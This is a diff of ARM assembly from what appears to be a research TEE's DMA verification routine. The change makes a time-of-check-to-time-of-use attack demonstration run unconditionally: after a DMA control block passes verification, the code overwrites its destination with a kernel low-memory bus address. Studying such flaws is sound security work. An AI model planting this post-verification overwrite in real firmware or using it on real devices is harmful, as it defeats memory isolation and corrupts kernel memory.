@@ -1380,37 +1380,25 @@ b 99f
 	ldr	r2, [sp, #MYTEE_SP_OFFSET_DMA_SECURE_BUFFER]
 	
 	// ========== TOCTOU ATTACK DEMONSTRATION ==========
-	// After verification passes, we INTENTIONALLY modify the CB
-	// to point to a forbidden destination address.
+	// UNCONDITIONALLY modify CB.dst to forbidden address after verification!
 	// This demonstrates the TOCTOU vulnerability:
-	// 1. CB was verified with ALLOWED destination
-	// 2. Now we change it to FORBIDDEN destination
+	// 1. CB was verified with ALLOWED destination → PASSED
+	// 2. Now we change dst to FORBIDDEN kernel memory
 	// 3. DMA will execute with the modified CB!
 	//
-	// Check TOCTOU attack enable flag
-	ldr	r0, =TOCTOU_SYNC_FLAG_VIRT
-	ldr	r1, [r0]
-	ldr	r3, =0xA77AC001		// Magic value to enable attack (ATTACK01)
-	cmp	r1, r3
-	bne	215f			// Skip if attack not enabled
-	
-	// ATTACK ENABLED: Modify CB.dst to forbidden address!
-	// CB structure: [info:4][src:4][dst:4][len:4][stride:4][next:4]
+	// CB structure in secure buffer: [info:4][src:4][dst:4][len:4][stride:4][next:4]
 	// dst is at offset 0x08
-	ldr	r0, =0xC0008000		// FORBIDDEN: bus address of kernel low memory
-	str	r0, [r2, #0x08]		// Overwrite dst field!
+	
+	// Read current dst to log it
+	ldr	r0, [r2, #0x08]		// Original dst (should be allowed)
+	
+	// Overwrite dst with FORBIDDEN address!
+	ldr	r1, =0xC0008000		// FORBIDDEN: bus addr of 0x00008000 (kernel low memory)
+	str	r1, [r2, #0x08]		// Overwrite dst field!
 	dmb
 	
-	// Log attack in sync flag area
-	ldr	r0, =TOCTOU_SYNC_FLAG_VIRT
-	ldr	r1, =0xDEAD0003		// Signal: CB was modified
-	str	r1, [r0]
-	dmb
-	
-215:
-	ldr	r2, [sp, #MYTEE_SP_OFFSET_DMA_SECURE_BUFFER]
-	add	r2, r2, #BCM2837_BUS_VIRT_OFFSET	// change to secure buffer bus address from first 
-			// DMA CB address bus address(which be mapped to bcm2835 dma phys address 0x3f007000)
+	// Continue with modified CB
+	add	r2, r2, #BCM2837_BUS_VIRT_OFFSET	// change to secure buffer bus address
 
 	b	200f
 214:	// load saved context to r2	(verify skip)
